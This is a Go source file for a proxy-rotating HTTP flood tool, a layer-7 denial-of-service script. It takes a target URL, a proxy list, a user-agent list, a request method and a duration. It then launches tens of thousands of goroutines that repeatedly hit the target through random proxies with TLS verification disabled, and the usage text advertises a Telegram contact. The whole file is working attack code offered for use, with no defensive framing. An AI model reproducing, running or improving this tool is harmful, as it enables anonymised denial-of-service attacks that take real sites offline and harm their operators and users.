package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}
func flood(host string, length int, proxylist []string, UAlist []string, wg *sync.WaitGroup, parsed string, mode string, timeout int) {
	ua := UAlist[rand.Intn(len(UAlist))]
restart:
	proxyUrl, err := url.Parse("http://" + proxylist[rand.Intn(len(proxylist))])

	defer wg.Done()

	tr := &http.Transport{

		Proxy: http.ProxyURL(proxyUrl),
		TLSClientConfig: &tls.Config{
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2"},
			ServerName:         parsed,
			InsecureSkipVerify: true,
		},

		ForceAttemptHTTP2: true,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(timeout) * time.Second,
	}

	req, err := http.NewRequest(mode, host, nil)
	req.Header.Set("User-Agent", ua)
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Add("accept-encoding", "gzip, deflate, br")
	req.Header.Add("accept-languag", "en-US,en;q=0.6")
	req.Header.Add("cache-control", "max-age=0")
	if err != nil {

		goto restart
	}

	var i int
	for start := time.Now(); time.Since(start) < time.Duration(length)*time.Second; {
		resp, err := client.Do(req)
		if err != nil {
			goto restart
		}
		defer resp.Body.Close()
		i++
	}
	return
}

func main() {
	if len(os.Args) < 3 {
		println("Usage: go run main.go <host> <length> <proxylist> <threads> <ua list> <mode> <timeout> \n Example: go run main.go https://example.com 10 proxylist.txt 1 ualist.txt HEAD 10 \n Conact : https://t.me/rateIimit")
		return
	}
	proxylist, err := readLines(os.Args[3])
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	threads, _ := strconv.Atoi(os.Args[4])
	threads = threads * 10000
	fmt.Println(threads)
	ualist, _ := readLines(os.Args[5])
	mode := os.Args[6]
	length, _ := strconv.Atoi(os.Args[2])
	timeout, _ := strconv.Atoi(os.Args[7])
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go flood(os.Args[1], length, proxylist, ualist, &wg, u.Hostname(), mode, timeout)
	}
	wg.Wait()

}
